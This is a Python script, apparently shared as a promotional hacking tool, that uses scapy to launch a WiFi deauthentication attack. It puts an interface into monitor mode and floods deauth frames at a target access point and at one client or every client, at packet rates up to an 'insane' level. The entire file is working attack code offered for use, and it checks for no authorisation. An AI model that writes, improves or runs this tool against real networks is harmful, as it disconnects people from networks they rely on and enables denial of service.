#!/usr/bin/env python3
"""
Packet Mirage - WiFi Poison Mode
Interactive CLI Version
"""

from scapy.all import *
import time
import os
import sys

print("\n=== Packet Mirage - WiFi Poison Mode ===\n")
print("Made by @germanhack40404 → Follow for more tools & cyber projects\n")

def setup_monitor(interface):
    print(f"[+] Putting {interface} into monitor mode...")
    os.system(f"sudo ip link set {interface.replace('mon','')} down 2>/dev/null")
    os.system(f"sudo iwconfig {interface.replace('mon','')} mode monitor 2>/dev/null")
    os.system(f"sudo ip link set {interface.replace('mon','')} up 2>/dev/null")
    print("[+] Monitor mode activated.\n")

def get_power_settings(power):
    settings = {
        "low":    {"pps": 40,  "sleep": 0.12},
        "medium": {"pps": 100, "sleep": 0.06},
        "high":   {"pps": 200, "sleep": 0.03},
        "insane": {"pps": 350, "sleep": 0.008}
    }
    return settings.get(power, settings["medium"])

# ===================== MAIN CLI =====================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Please run with: sudo python3 wifi_poison.py")
        sys.exit(1)

    # Interface
    iface = input("Enter monitor interface [wlan0mon]: ").strip() or "wlan0mon"

    setup_monitor(iface)

    # BSSID
    bssid = input("\nEnter Target Router BSSID (MAC Address): ").strip()
    if not bssid:
        print("[-] BSSID is required!")
        sys.exit(1)

    # Client
    client = input("Target Client MAC (press Enter for all clients): ").strip() or "ff:ff:ff:ff:ff:ff"

    # Power Level
    print("\nPower Levels:")
    print("   low    → Soft disconnect")
    print("   medium → Good effect")
    print("   high   → Strong")
    print("   insane → Very aggressive")
    
    power = input("\nChoose power level (medium): ").strip().lower() or "medium"

    # Duration
    try:
        duration = int(input("Attack duration in seconds (15): ") or "15")
    except:
        duration = 15

    # Start Attack
    settings = get_power_settings(power)
    pps = settings["pps"]
    sleep_time = settings["sleep"]

    print(f"\n🚀 Starting {power.upper()} WiFi Poison Attack...")
    print(f"Target AP   : {bssid}")
    print(f"Target Client: {client}")
    print(f"Duration    : {duration} seconds")
    print(f"Power       : {power.upper()} ({pps} packets/sec)\n")

    try:
        dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        start_time = time.time()
        sent = 0

        while time.time() - start_time < duration:
            sendp(packet, iface=iface, count=pps//8, verbose=0)
            sent += pps//8
            time.sleep(sleep_time)

            if sent % 300 == 0:
                print(f"[+] Sent {sent} deauth packets...")

    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user.")
    except Exception as e:
        print(f"[-] Error: {e}")

    print(f"\n✅ Attack finished. {sent} packets sent.")
    print("Clients should reconnect automatically.")
    print("\nMade by @germanhack40404 → Check out my other projects!")
